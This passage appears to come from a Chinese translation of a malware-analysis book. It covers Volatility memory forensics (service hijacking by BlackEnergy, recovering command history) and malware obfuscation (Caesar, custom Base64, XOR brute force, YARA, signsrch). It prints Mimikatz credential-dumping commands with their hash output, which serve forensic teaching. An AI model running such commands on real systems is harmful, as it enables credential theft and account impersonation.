C:\\Windows\\svchost.exe对于实现为DLL(服务DLL)的服务，您可以通过向svccan插件传递-v(——verbose)选项来显示服务DLL(或内核驱动程序)的完整路径。-v选项用于打印与服务相关的详细信息。下面是一个以DLL形式运行服务的恶意软件的例子。服务状态设置为SERVICE_START_PENDING，启动类型设置为SERVICE_AUTO_START，这告诉你这个服务还没有启动，会在系统启动时自动启动:\n$ python vol.py -f svc.vmem --profile=Win7SP1x86 svcscan [REMOVED] Offset: 0x5903a8 Order: 396 Start: SERVICE_AUTO_START Process ID: - Service Name: FastUserSwitchingCompatibility Display Name: FastUserSwitchingCompatibility Service Type: SERVICE_WIN32_SHARE_PROCESS Service State: SERVICE_START_PENDING Binary Path: - ServiceDll: C:\\Windows\\system32\\FastUserSwitchingCompatibilityex.dll ImagePath: %SystemRoot%\\System32\\svchost.exe -k netsvcs一些恶意程序会劫持未使用或禁用的现有服务，以持久化在系统上。这种恶意软件的一个例子是BlackEnergy，它取代了名为aliide的合法内核驱动程序。Sys在磁盘上。这个内核驱动程序与一个名为aliide的服务相关联。在替换驱动程序之后，它会修改与aliide服务相关联的注册表项，并将其设置为自动启动(也就是说，当系统启动时，服务会自动启动)。很难发现此类攻击。检测此类修改的一种方法是保留一个干净内存映像中的所有服务的列表，并将其与可疑映像中的服务列表进行比较，以查找任何修改。下面是清除内存映像中aliide服务的服务配置。合法的aliide服务被设置为按需启动(需要手动启动)，服务处于停止状态:\n$ python vol.py -f win7_clean.vmem --profile=Win7SP1x64 svcscan Offset: 0x871c30 Order: 11 Start: SERVICE_DEMAND_START Process ID: - Service Name: aliide Display Name: aliide Service Type: SERVICE_KERNEL_DRIVER Service State: SERVICE_STOPPED Binary Path: -以下是感染了BlackEnergy的内存映像的svcscan输出。修改完成后，aliide服务被设置为“autostart”(系统启动时会自动启动)，且仍处于“stopped”状态。这意味着重新启动系统后，服务将自动启动并加载恶意aliide。系统驱动程序。关于这个BlackEnergy释放器的详细分析，请参阅作者的博客文章https://cysinfo.com/blackout-memory-analysis-of-blackenergy-big-dropper/:\n$ python vol.py -f be3_big.vmem --profile=Win7SP1x64 svcscan Offset: 0x881d30 Order: 12 Start: SERVICE_AUTO_START Process ID: - Service Name: aliide Display Name: aliide Service Type: SERVICE_KERNEL_DRIVER Service State: SERVICE_STOPPED Binary Path: -11. 提取命令历史 影响系统后,攻击者可以执行各种命令在命令shell列举用户,组,和共享你的网络,或攻击者可能转移等工具Mimikatz (https://github.com/gentilkiwi/mimikatz)组成系统和执行它转储Windows凭据。Mimikatz是一个开源工具，由Benjamin Delpy于2011年编写。它是从Windows系统收集凭证的最流行工具之一。Mimikatz以不同的方式发布，比如编译版(https://github.com/gentilkiwi/mimikatz)，并且是PowerSploit (https://github.com/PowerShellMafia/PowerSploit)和PowerShell Empire (https://github.com/EmpireProject/Empire)等PowerShell模块的一部分。\n命令历史可以提供有关攻击者在受损系统上活动的有价值的信息。通过检查命令历史，您可以确定诸如已执行的命令、调用的程序以及攻击者访问的文件和文件夹等信息。两个Volatility插件cmdscan和consoles可以从内存映像中提取命令历史记录。这些插件从csrs.exe (Windows 7之前)或conhost.exe (Windows 7及更高版本)进程中提取命令历史。\n要了解这些插件的详细工作原理，请阅读《内存取证的艺术》一书或阅读理查德·史蒂文斯和Eoghan Casey的研究论文《从物理内存中提取Windows命令行细节》(http://www.dfrws.org/2010/proceedings/2010-307.pdf)。\ncmdscan插件会列出cmd.exe所执行的命令。下面的示例深入了解系统上的窃取凭据活动。从cmdscan输出中，您可以看到通过命令shell (cmd.exe)调用了名称为net.exe的应用程序。从net.exe中提取的命令中，可以看出命令特权::debug和sekurlsa::logonpasswords与Mimikatz相关联。在这种情况下，Mimikatz应用程序被重命名为net.exe:\n$ python vol.py -f mim.vmem --profile=Win7SP1x64 cmdscan [REMOVED] CommandProcess: conhost.exe Pid: 2772 CommandHistory: 0x29ea40 Application: cmd.exe Flags: Allocated, Reset CommandCount: 2 LastAdded: 1 LastDisplayed: 1 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x5c Cmd #0 @ 0x29d610: cd \\ Cmd #1 @ 0x27b920: cmd.exe /c %temp%\\net.exe Cmd #15 @ 0x260158: ) Cmd #16 @ 0x29d3b0: ) [REMOVED] ************************************************** CommandProcess: conhost.exe Pid: 2772 CommandHistory: 0x29f080 Application: net.exe Flags: Allocated, Reset CommandCount: 2 LastAdded: 1 LastDisplayed: 1 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0xd4 Cmd #0 @ 0x27ea70: privilege::debug Cmd #1 @ 0x29b320: sekurlsa::logonpasswords Cmd #23 @ 0x260158: ) Cmd #24 @ 0x29ec20: 'cmdscan插件会显示攻击者执行的命令。要了解命令是否成功，可以使用控制台插件。运行控制台插件后，可以看到net.exe确实是一个Mimikatz应用程序，为了转储凭证，使用Mimikatz shell执行了Mimkatz命令。从输出中，您可以知道凭据已成功转储，密码已以明文形式检索:\n$ python vol.py -f mim.vmem --profile=Win7SP1x64 consoles ---- CommandHistory: 0x29ea40 Application: cmd.exe Flags: Allocated, Reset CommandCount: 2 LastAdded: 1 LastDisplayed: 1 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x5c Cmd #0 at 0x29d610: cd \\ Cmd #1 at 0x27b920: cmd.exe /c %temp%\\net.exe ---- Screen 0x280ef0 X:80 Y:300 Dump: Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ecd \\ C:\\\u003ecmd.exe /c %temp%\\net.exe [REMOVED] mimikatz # privilege::debug Privilege '20' OK mimikatz # sekurlsa::logonpasswords Authentication Id : 0 ; 269689 (00000000:00041d79) Session : Interactive from 1 User Name : test Domain : PC Logon Server : PC Logon Time : 5/4/2018 10:00:59 AM SID : S-1-5-21-1752268255-3385687637-2219068913-1000 msv : [00000003] Primary * Username : test * Domain : PC * LM : 0b5e35e143b092c3e02e0f3aaa0f5959 * NTLM : 2f87e7dcda37749436f914ae8e4cfe5f * SHA1 : 7696c82d16a0c107a3aba1478df60e543d9742f1 tspkg : * Username : test * Domain : PC * Password : cleartext wdigest : * Username : test * Domain : PC * Password : cleartext kerberos : * Username : test * Domain : PC * Password : cleartext 在Windows 8.1和更高版本上，您可能无法使用Mimikatz以明文形式转储密码，但是，Mimikatz为攻击者提供了各种功能。攻击者可以使用提取的NTLM散列来模拟帐户。关于Mimikatz的详细信息以及如何使用它来提取Windows凭据，请阅读https://adsecurity.org/?page_id=1821。\n总结 内存取证是一项伟大的技术，从计算机的内存寻找和提取司法证据。除了使用内存取证进行恶意软件调查之外，您还可以将其作为恶意软件分析的一部分，以获得关于恶意软件行为和特征的额外信息。本章涵盖了不同的Volatility插件，这些插件使你能够了解在组成的系统上发生的事件，并提供对恶意软件活动的洞察。在下一章中，我们将使用更多的volatile插件来确定高级恶意软件的功能，并且您将了解如何使用这些插件来提取司法证据。\n",
    "description": "",
    "tags": "恶意样本分析,学习",
    "title": "恶意样本分析-10-使用内存取证狩猎恶意软件",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-11-%E4%BD%BF%E7%94%A8%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E7%8B%A9%E7%8C%8E%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/index.html"
  },
  {
    "content": "9. 恶意软件的混淆技术 混淆一词指的是掩盖有意义信息的过程。恶意软件作者经常使用各种混淆技术来隐藏信息，并修改恶意内容，使安全分析人员难以发现和分析。敌方通常使用编码/加密技术来掩盖安全产品的信息。除了使用编码/加密，攻击者还使用打包器等程序来混淆恶意二进制内容，这使得分析和逆向工程更加困难。在本章中，我们将研究如何识别这些混淆技术，以及如何解码/解密和解压恶意二进制文件。我们将首先看一下编码/加密技术，随后我们将看一下解包技术。\n攻击者通常出于以下原因使用编码和加密。\n掩盖命令和控制通信 隐藏基于签名的解决方案，如入侵防御系统 隐藏恶意软件所使用的配置文件的内容 加密从受害者系统中传出的信息 混淆恶意二进制文件中的字符串，以躲避静态分析 在我们深入研究恶意软件如何使用加密算法之前，让我们试着了解一下本章将使用的基本知识和一些术语。明文是指未加密的信息；这可能是命令和控制（C2）流量或恶意软件想要加密的文件内容。加密文本指的是加密信息；这可能是恶意软件从C2服务器收到的加密的可执行文件或加密命令。\n恶意软件对明文进行加密，将明文与密钥一起作为输入传递给加密函数，从而产生一个密码文本。由此产生的密码文本通常被恶意软件用来写入文件或通过网络发送。\n以同样的方式，恶意软件可以从C2服务器或文件中接收加密的内容，然后通过将加密的内容和密钥传递给解密功能来解密，如下所示。\n在分析恶意软件时，你可能想了解某个特定内容是如何被加密或解密的。要做到这一点，你将主要关注识别加密或解密功能以及用于加密或解密内容的密钥。例如，如果你想确定网络内容是如何被加密的，那么你可能会在网络输出操作（如HttpSendRequest()）之前找到加密函数。以同样的方式，如果你想知道C2的加密内容是如何被解密的，那么你很可能在使用诸如InternetReadFile()这样的API从C2检索到内容后找到解密函数。\n一旦确定了加密/解密功能，检查这些功能将使你了解内容是如何加密/解密的，使用的密钥，以及用于混淆数据的算法。\n1. 简单编码 大多数时候，攻击者使用非常简单的编码算法，如Base64编码或xor加密来掩盖数据。攻击者之所以使用简单的算法，是因为它们容易实现，占用较少的系统资源，而且刚好可以掩盖安全产品和安全分析人员分析的内容。\n1.1 凯撒密码 凯撒密码，也被称为移位密码，是一种传统的密码，是最简单的编码技术之一。它通过将明文中的每个字母在字母表中下移一些固定的位置来对信息进行编码。例如，如果你将字符 “A “向下移动3个位置，那么你将得到 “D”，而 “B “将是 “E”，以此类推，当移动到 “X “时，将包裹回 “A”。\n1.1.1 凯撒密码的工作原理 理解凯撒密码的最好方法是写下从A到Z的字母，并给这些字母分配一个索引，从0到25，如下所示换句话说，‘A’对应于索引0，‘B’对应于索引1，以此类推。一组从A到Z的所有字母被称为字符集。\n现在，让我们假设你想把字母转移三个位置，那么3就成了你的密钥。为了加密字母’A’，将字母A的索引，即0，加到钥匙3上；这样的结果是0+3=3。现在用结果3作为索引，找到相应的字母，也就是’D’，这样’A’就被加密成’D’了。为了加密’B’，你将把’B’的索引（1）加到钥匙3上，结果是4，索引4与’E’有关，所以’B’加密为’E’，以此类推。\n这种技术的问题出现在我们到达’X’的时候，它的索引是23。当我们将23+3相加时，我们得到26，但我们知道没有与索引26相关的字符，因为最大索引值是25。我们还知道，索引26应该绕回索引0（与’A’相关）。为了解决这个问题，我们用字符集的长度进行模数运算。在这种情况下，字符集ABCDEFGHIJKLMNOPQRSTUVWXYZ的长度是26。现在，为了加密’X’，我们使用’X’的索引（23）并将其添加到密钥（3）中，然后对字符集的长度（26）进行模数运算（也就是26=0(mod26)），如下所示。这个操作的结果是0，它被用作索引来寻找相应的字符，也就是’A’。\n(23+3)%26 = 0模数操作允许你循环回到开头。你可以用同样的逻辑来加密字符集中的所有字符（从A到Z），并绕回起点。在凯撒密码中，你可以用以下方法获得被加密（密文）字符的索引。\n(i + key) % (length of the character set 字符串长度) where i = index of plaintext character 明文字符串索引以同样的方式，你可以用以下方式获得明文（解密）字符的索引。\n(j - key) % (length of the character set) where j = index of ciphertext character下图显示了字符集、加密和以3为密钥的文本 “ZEUS “的解密（移动三个位置）。加密后，文本 “ZEUS “被翻译成 “CHXV”，然后解密又将其翻译成 “ZEUS”。\n1.1.2 用Python解密凯撒密码 下面是一个简单的Python脚本的例子，它将字符串 “CHXV “解密为 “ZEUS”。\n\u003e\u003e\u003e chr_set = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" \u003e\u003e\u003e key = 3 \u003e\u003e\u003e cipher_text = \"CHXV\" \u003e\u003e\u003e plain_text = \"\" \u003e\u003e\u003e for ch in cipher_text: j = chr_set.find(ch.upper()) plain_index = (j-key) % len(chr_set) plain_text += chr_set[plain_index] \u003e\u003e\u003e print plain_text ZEUS 一些恶意软件样本可能使用凯撒（shift）密码的修改版本；在这种情况下，你可以修改前面提到的脚本以满足你的需求。APT1集团使用的恶意软件WEBC2-GREENCAT从C2服务器获取内容，并使用修改版的凯撒密码对内容进行解密。它使用了一个66个字符的字符集\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01 23456789._/-\"，和一个56的密钥。\n1.2 base64编码 使用凯撒密码，攻击者可以对字母进行加密，但对二进制数据的加密还不够好。攻击者使用其他各种编码/加密算法来加密二进制数据。Base64编码允许攻击者将二进制数据编码为ASCII字符串格式。由于这个原因，你会经常看到攻击者在HTTP等纯文本协议中使用Base64编码的数据。\n1.2.1 将数据转换为Base64 标准的Base64编码由以下64个字符集组成。你要编码的二进制数据的每3个字节（24位）被翻译成该字符集的四个字符。每个翻译的字符大小为6比特。除了以下字符外，=字符用于填充。\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/为了了解数据如何被翻译成Base64编码，首先，建立Base64索引表，将索引0到63分配给字符集中的字母，如图所示。按照下表，索引0对应于字母A，索引62对应于+，以此类推。\n现在，让我们假设我们想对文本 “One “进行Base64编码。要做到这一点，我们需要将字母转换为其相应的比特值，如图所示。\nO （ascii=79）-\u003e 0x4f -\u003e 01001111 n (ascii=110)-\u003e 0x6e -\u003e 01101110 e （ascii=101）-\u003e 0x65 -\u003e 01100101 Base64算法一次处理3个字节（6比特）（24位）；在这种情况下，我们正好有24个比特，它们彼此相邻放置，如图所示。\n010011110110111001100101然后，这24位被分成四部分，每部分由6位组成，并转换为其等效的十进制值。然后，十进制值被用作索引，以便在Base64索引表中找到相应的值，因此文本一被编码为T25l。\n010011 -\u003e 19 -\u003e base64 table lookup -\u003e T 110110 -\u003e 54 -\u003e base64 table lookup -\u003e 2 111001 -\u003e 57 -\u003e base64 table lookup -\u003e 5 100101 -\u003e 37 -\u003e base64 table lookup -\u003e l 解码Base64是一个反向的过程，但理解Base64编码或解码的工作原理并不是必须的，因为有一些python模块和工具可以让你在不了解算法的情况下解码Base64编码的数据。在攻击者使用自定义版本的Base64编码的情况下，了解它将有所帮助。\n1.2.2 编码和解码 Base64 要在Python(2.x)中使用Base64对数据进行编码，请使用以下代码。\n\u003e\u003e\u003e import base64 \u003e\u003e\u003e plain_text = \"One\" \u003e\u003e\u003e encoded = base64.b64encode(plain_text) \u003e\u003e\u003e print encoded T25l要在python中解码base64数据，请使用以下代码。\n\u003e\u003e\u003e import base64 \u003e\u003e\u003e encoded = \"T25l\" \u003e\u003e\u003e decoded = base64.b64decode(encoded) \u003e\u003e\u003e print decoded OneGCHQ的CyberChef是一个伟大的web应用程序，允许你在浏览器中进行各种编码/解码、加密/解密、压缩/解压和数据分析操作。你可以通过以下网址访问CyberChef：https://gchq.github.io/CyberChef/，更多的细节可以在https://github.com/gchq/ CyberChef找到。\n你也可以使用诸如ConverterNET（http://www.kahusecurity.com/tools/）这样的工具对base64数据进行编码/解码。ConvertNET提供各种功能，允许你将数据转换为/从许多不同的格式。要进行编码，在输入栏中输入要编码的文本，然后点击Text to Base64按钮。要解码，在输入栏中输入要编码的数据，然后点击Base64到文本按钮。下面的截图显示了使用ConverterNET对字符串Hi进行的Base64编码。\n编码后的字符串末尾的=字符是填充字符。如果你还记得，该算法将三个字节的输入转换为四个字符，由于Hi只有两个字符，它被填充成三个字符；只要使用了填充，你就会在Base64编码的字符串的末尾看到=字符。这意味着一个有效的Base64编码的字符串的长度总是4的倍数。\n1.2.3 解码自定义的Base64 攻击者使用不同的Base64编码变化；其目的是阻止Base64解码工具成功解码数据。在本节中，你将了解这些技术中的一些。\n一些恶意软件样本将填充字符（=）从末端移除。这里显示了一个恶意软件样本（Trojan Qidmorks）进行的C2通信。下面的帖子有效载荷看起来是用base64编码的。\n当你试图解码POST有效载荷时，你会得到不正确的填充错误，如下所示。\n这个错误的原因是，编码字符串的长度（150）不是4的倍数。换句话说，Base64编码的数据中缺少两个字符，这很可能是填充字符（==）。\n\u003e\u003e\u003e encoded = \"Q3VycmVudFZlcnNpb246IDYuMQ0KVXNlciBwcml2aWxlZ2llcyBsZXZlbDogMg0KUGFyZW50IHByb2Nlc3M6IFxEZXZpY2VcSGFyZGRpc2tWb2x1bWUxXFdpbmRvd3NcZXhwbG9yZXIuZXhlDQoNCg\" \u003e\u003e\u003e len(encoded) 150 将两个填充字符（==）附加到编码的字符串中，成功地解码了数据，如图所示。从解码后的数据可以看出，恶意软件向C2服务器发送了操作系统版本（6.1代表Windows 7）、用户的权限级别和父进程。\n有时，恶意软件作者使用base64编码的轻微变化。例如，攻击者可以使用一个字符集，其中字符-和_被用来代替+和/（第63和64个字符），如图所示。\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_一旦你确定了在原始字符集中被替换的字符来对数据进行编码，那么你就可以使用如图所示的代码。这里的意思是将修改后的字符替换回标准字符集中的原始字符，然后再进行解码。\n\u003e\u003e\u003e import base64 \u003e\u003e\u003e encoded = \"cGFzc3dvcmQxMjM0IUA_PUB-\" \u003e\u003e\u003e encoded = encoded.replace(\"-\",\"+\").replace(\"_\",\"/\") \u003e\u003e\u003e decoded = base64.b64decode(encoded) \u003e\u003e\u003e print decoded password1234!@?=@~有时，恶意软件作者会改变字符集中的字符顺序。例如，他们可能使用以下字符集而不是标准字符集。\n0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz当攻击者使用非标准的Base64字符集时，你可以用以下代码对数据进行解码。注意，在下面的代码中，除了64个字符外，变量chr_set和non_chr_set还包括填充字符=（第65个字符），这是正确解码所需要的。\n\u003e\u003e\u003e import base64 \u003e\u003e\u003e chr_set = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\" \u003e\u003e\u003e non_chr_set = \"0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz=\" \u003e\u003e\u003e encoded = \"G6JgP6w=\" \u003e\u003e\u003e re_encoded = \"\" \u003e\u003e\u003e for en_ch in encoded: re_encoded += en_ch.replace(en_ch, chr_set[non_chr_set.find(en_ch)]) \u003e\u003e\u003e decoded = base64.b64decode(re_encoded) \u003e\u003e\u003e print decoded Hello你也可以使用ConverterNET工具，通过选择转换|转换自定义Base64来执行自定义Base64解码。只要在Alphabet字段中输入自定义的Base64字符集，然后在Input字段中输入要解码的数据，并按下Decode按钮，如图所示。\n1.2.4 识别Base64 你可以通过寻找一个由Base64字符集（字母数字字符、+和/）组成的长字符串来识别一个使用Base64编码的二进制文件。下面的截图显示了恶意二进制文件中的Base64字符集，表明恶意软件可能使用了Base64编码。\n你可以使用字符串交叉引用功能（在第5章中涉及）来定位使用Base64字符集的代码，如以下截图所示。即使没有必要知道代码中哪里使用了Base64字符集来解码Base64数据，但有时，定位它是有用的，例如在恶意软件作者使用Base64编码和其他加密算法的情况下。例如，如果恶意软件用某种加密算法对C2网络流量进行加密，然后使用Base64编码；在这种情况下，定位Base64字符集可能会使你进入Base64函数。然后你可以分析Base64函数或确定调用Base64函数的函数（使用Xrefs功能），这可能会导致你找到加密函数。\n你可以在x64dbg中使用字符串交叉引用；要做到这一点，确保调试器在模块内任何地方暂停，然后在反汇编窗口（CPU窗口）上点击右键，选择搜索|当前模块|字符串引用。\n另一种检测二进制文件中是否存在Base64字符集的方法是使用YARA规则（YARA在第2章 “静态分析 “中讲过），如这里所示。\nrule base64 { strings: $a=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" $b=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_\" condition: $a or $b }1.3 XOR 编码 除了Base64编码，恶意软件作者使用的另一种常见编码算法是XOR编码算法。XOR是一种位操作（像AND、OR和NOT），它是在操作数的相应位上进行的。下表描述了XOR操作的属性。在XOR操作中，当两个位都相同时，结果为0；否则，结果为1。\n例如，当你XOR 2和4时，即2 ^ 4，结果是6，其工作方式如图所示。\n2: 0000 0010 4: 0000 0100 --------------------------- Result After XOR : 0000 0110 (6)1.3.1 单字节XOR 在单字节XOR中，明文的每个字节都与加密密钥进行XOR。例如，如果攻击者想用0x40的密钥对明文cat进行加密，那么文本中的每个字符（字节）都会与0x40进行XOR，从而得到密码文本#！4。 下图显示了每个单独字符的加密过程。\nXOR的另一个有趣的特性是，当你将密码文本与用于加密的相同密钥进行XOR时，你将得到原文文本。例如，如果你把前面例子中的密码文本#！4与0x40（密钥）进行XOR，你会得到cat。这意味着，如果你知道密钥，那么同一个函数就可以用来加密和解密数据。下面是一个简单的python脚本，用于执行XOR解密（同样的函数也可以用于执行XOR加密）。\ndef xor(data, key): translated = \"\" for ch in data: translated += chr(ord(ch) ^ key) return translated if __name__ == \"__main__\": out = xor(\"#!4\", 0x40) print out有了对XOR编码算法的了解，让我们看看一个键盘记录器的例子，它将所有输入的按键编码到一个文件。当这个例子被执行时，它记录了击键，并使用CreateFileA()API打开了一个文件（所有击键都将被记录），如图所示。使用CreateFileA()API打开一个文件（其中所有的击键将被记录），如下面的截图所示。然后，它使用WriteFile()API将记录的击键写到文件中。请注意，恶意软件在调用CreateFileA()之后、WriteFile()之前调用了一个函数（重命名为enc_function）；该函数在将内容写入文件之前对其进行编码。enc_function需要两个参数；第一个参数是包含要加密的数据的缓冲区，第二个参数是缓冲区的长度。\n检查enc_function可以发现恶意软件使用单字节异或。它从数据缓冲区中读取每个字符并使用0x5A的键进行编码，如下所示。在下面的XOR循环中，edx寄存器指向数据缓冲区，esi寄存器包含缓冲区的长度，ecx寄存器作为数据缓冲区的索引，在循环结束时增加，只要索引值(ecx)小于缓冲区的长度(esi)，循环就会继续:\n1.3.2 通过蛮力找到XOR密钥 在单字节XOR中，密钥的长度是一个字节，所以只能有255个可能的密钥（0x0-0xff），但0作为密钥除外，因为将任何值与0进行XOR都会得到相同的结果（即没有加密）。由于只有255个密钥，你可以在加密的数据上尝试所有可能的密钥。如果你知道要在解密的数据中找到什么，这种技术就很有用。例如，在执行一个恶意软件样本时，假设恶意软件得到计算机主机名mymachine，并与一些数据连接，执行单字节xor加密，将其加密为密码文lkwpjeia\u003ei}ieglmja。让我们假设这个密码文本在C2通信中被渗出。现在，为了确定用于加密密文的密钥，你可以分析加密函数，或对其进行暴力破解。下面的python命令实现了暴力技术；由于我们期望解密的字符串包含 “mymachine”，脚本用所有可能的密钥解密加密的字符串（密码文本），并在找到 “mymachine “时显示密钥和解密的内容。在下面的例子中，你可以看到密钥被确定为4，解密后的内容hostname:mymachine，包括主机名mymachine。\n\u003e\u003e\u003e def xor_brute_force(content, to_match): for key in range(256): translated = \"\" for ch in content: translated += chr(ord(ch) ^ key) if to_match in translated: print \"Key %s(0x%x): %s\" % (key, key, translated) \u003e\u003e\u003e xor_brute_force(\"lkwpjeia\u003ei}ieglmja\", \"mymachine\") Key 4(0x4): hostname:mymachine你也可以使用一个工具，如ConverterNET，用暴力手段确定密钥。要做到这一点，请选择工具|密钥搜索/转换。在弹出的窗口中，输入加密的内容和匹配的字符串，然后按下搜索按钮。如果找到了密钥，它将显示在结果栏中，如图所示。\n蛮力技术（爆破）在确定用于加密PE文件（如EXE或DLL）的XOR密钥时很有用。只要在解密的内容中寻找匹配的字符串MZ或这个程序不能在DOS模式下运行。\n1.3.3 忽略XOR编码的NULL 在XOR编码中，当一个空字节（0x00）与一个密钥进行XOR时，你会得到密钥，如图所示。\n\u003e\u003e\u003e ch = 0x00 \u003e\u003e\u003e key = 4 \u003e\u003e\u003e ch ^ key 4这意味着只要对含有大量空字节的缓冲区进行编码，单字节的xor密钥就会清晰可见。在下面的例子中，明文变量被分配了一个包含三个空字节的字符串，用密钥0x4b（字符K）进行加密，加密后的输出以十六进制字符串格式和文本格式打印。请注意明文变量中的三个空字节是如何转化为加密内容中的XOR密钥值0x4b 0x4b 0x4b或（KKK）。如果不忽略空字节，XOR的这一特性使我们很容易发现密钥。\n\u003e\u003e\u003e plaintext = \"hello\\x00\\x00\\x00\" \u003e\u003e\u003e key = 0x4b \u003e\u003e\u003e enc_text = \"\" \u003e\u003e\u003e for ch in plaintext: x = ord(ch) ^ key enc_hex += hex(x) + \" \" enc_text += chr(x) \u003e\u003e\u003e print enc_hex 0x23 0x2e 0x27 0x27 0x24 0x4b 0x4b 0x4b \u003e\u003e\u003e print enc_text #.''$KKK下面的截图显示了一个恶意软件样本（HeartBeat RAT）的XOR-加密通信。请注意到处都有0x2字节；这是由于恶意软件用0x2的XOR密钥加密了一个大的缓冲区（包含空字节）。关于这个恶意软件的逆向工程的更多信息，请参考作者的Cysinfo会议演讲：https://cysinfo.com/session-10-part-1-reversing-decrypting-communications-of-heartbeat-rat/。\n为了避免空字节问题，恶意软件作者在加密过程中会忽略空字节（0x00）和加密密钥，如这里提到的命令中所示。请注意，在下面的代码中，除了空字节（0x00）和加密密钥字节（0x4b）外，明文字符都是用密钥0x4b加密的；因此，在加密的输出中，空字节被保留下来，而不会泄露加密密钥。正如你所看到的，当攻击者使用这种技术时，仅仅通过查看加密的内容，是不容易确定密钥的。\n\u003e\u003e\u003e plaintext = \"hello\\x00\\x00\\x00\" \u003e\u003e\u003e key = 0x4b \u003e\u003e\u003e enc_text = \"\" \u003e\u003e\u003e for ch in plaintext: if ch == \"\\x00\" or ch == chr(key): enc_text += ch else: enc_text += chr(ord(ch) ^ key) \u003e\u003e\u003e enc_text \"#.''$\\x00\\x00\\x00\"1.3.4 多字节XOR编码 攻击者通常使用多字节的XOR，因为它能更好地防御暴力破解技术。例如，如果恶意软件作者使用4字节的XOR密钥来加密数据，然后进行暴力破解，你将需要尝试4,294,967,295（0xFFFFFFFF）可能的密钥，而不是255（0xFF）密钥。下面的截图显示了恶意软件（Taidoor）的XOR解密循环。在这种情况下，Taidoor从其资源部分提取了加密的PE（exe）文件，并使用4字节的XOR密钥0xEAD4AA34将其解密。\n下面的屏幕截图显示了资源黑客工具中的加密资源。通过右键点击资源，然后选择将资源保存为*.bin文件，可以将资源提取并保存到文件。\n下面的屏幕截图显示了资源黑客工具中的加密资源。通过右键点击资源，然后选择将资源保存为*.bin文件，可以将资源提取并保存到文件。\nimport os import struct import sys def four_byte_xor(content, key ): translated = \"\" len_content = len(content) index = 0 while (index \u003c len_content): data = content[index:index+4] p = struct.unpack(\"I\", data)[0] translated += struct.pack(\"I\", p ^ key) index += 4 return translated in_file = open(\"rsrc.bin\", 'rb') out_file = open(\"decrypted.bin\", 'wb') xor_key = 0xEAD4AA34 rsrc_content = in_file.read() decrypted_content = four_byte_xor(rsrc_content,xor_key) out_file.write(decrypted_content)解密后的内容是一个PE（可执行文件），如图所示。\n$ xxd decrypted.bin | more 00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000 MZ.............. 00000010: b800 0000 0000 0000 4000 0000 0000 0000 ........@....... 00000020: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000030: 0000 0000 0000 0000 0000 0000 f000 0000 ................ 00000040: 0e1f ba0e 00b4 09cd 21b8 014c cd21 5468 ........!..L.!Th 00000050: 6973 2070 726f 6772 616d 2063 616e 6e6f is program canno 00000060: 7420 6265 2072 756e 2069 6e20 444f 5320 t be run in DOS1.3.5 识别XOR编码 为了识别XOR编码，在IDA中加载二进制文件，通过选择Search|Text来搜索XOR指令。在出现的对话框中，输入xor并选择查找所有出现的情况，如图所示。\n当你点击 “确定 “时，你会看到所有XOR的出现。在操作数为相同寄存器的情况下，XOR操作是非常常见的，例如xor eax,eax或xor ebx,ebx。这些指令被编译器用来清零寄存器的值，你可以忽略这些指令。要识别XOR编码，可以寻找（a）一个寄存器（或内存引用）与一个常量值的XOR，如这里所示，或者（b）寻找一个寄存器（或内存引用）与一个不同的寄存器（或内存引用）的XOR。你可以通过双击条目导航到代码。\n以下是一些你可以用来确定XOR密钥的工具。除了使用XOR编码外，攻击者还可能使用ROL、ROT或SHIFT操作来编码数据。这里提到的XORSearch和Balbuzard除了支持XOR之外，还支持ROL、ROT和Shift操作。CyberChef几乎支持所有类型的编码、加密和压缩算法。\nCyberChef:* https://gchq.github.io/CyberChef/\nXORSearch* by Didier Stevens: https://blog.didierstevens.com/programs/ xorsearch/\nBalbuzard:* https://bitbucket.org/decalage/balbuzard/wiki/Home unXOR: https://github.com/tomchop/unxor/#unxor\nbrxor.py:* https://github.com/REMnux/distro/blob/v6/brxor.py NoMoreXOR.py: https://github.com/hiddenillusion/NoMoreXOR\n2. 恶意软件加密 恶意软件作者经常使用简单的编码技术，因为这只足以掩盖数据，但有时，攻击者也使用加密技术。为了识别二进制文件中加密功能的使用，你可以寻找加密指标（签名），如：。\n引用加密功能的字符串或导入表 加密的常量 加密程序使用的独特指令序列 2.1 使用Signsrch识别加密货币签名 搜索文件或进程中的加密签名的一个有用工具是Signsrch，它可以从http://aluigi.altervista.org/mytoolz.htm。这个工具依靠密码学签名来检测加密算法。加密签名位于一个文本文件中，即signsrch.sig。在下面的输出中，当signsrch以-e选项运行时，它显示在二进制文件中检测到DES签名的相对虚拟地址。\nC:\\signsrch\u003esignsrch.exe -e kav.exe Signsrch 0.2.4 by Luigi Auriemma e-mail: aluigi@autistici.org web: aluigi.org optimized search function by Andrew http://www.team5150.com/~andrew/ disassembler engine by Oleh Yuschuk - open file \"kav.exe\" - 91712 bytes allocated - load signatures - open file C:\\signsrch\\signsrch.sig - 3075 signatures in the database - start 1 threads - start signatures scanning: offset num description [bits.endian.size] -------------------------------------------- 00410438 1918 DES initial permutation IP [..64] 00410478 